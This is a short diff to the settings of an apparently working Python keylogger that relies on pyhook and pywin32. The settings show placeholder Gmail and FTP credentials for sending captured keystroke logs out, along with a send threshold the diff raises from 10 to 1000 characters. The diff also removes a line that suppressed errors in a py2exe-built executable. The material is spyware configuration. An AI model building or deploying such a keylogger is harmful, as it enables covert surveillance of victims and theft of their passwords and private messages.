@@ -19,8 +19,6 @@ except ImportError:
     print("required pyhook, pywin32 and pyautogui")
     exit()
 
-sys.stderr = None  # prevent py2exe from showing error
-
 strEmailAc = "email@gmail.com"
 strEmailPass = "pass"
 
@@ -31,7 +29,7 @@ strFtpUser = ""
 strFtpPass = ""
 strFtpRemotePath = "/"
 
-intCharPerSend = 10  # set num of chars before send log/store
+intCharPerSend = 1000  # set num of chars before send log/store
 
 blnUseTime = "False"  # if you prefer to use a timer to send/save logs, set this to True
 intTimePerSend = 120  # set how often to send/save logs in seconds
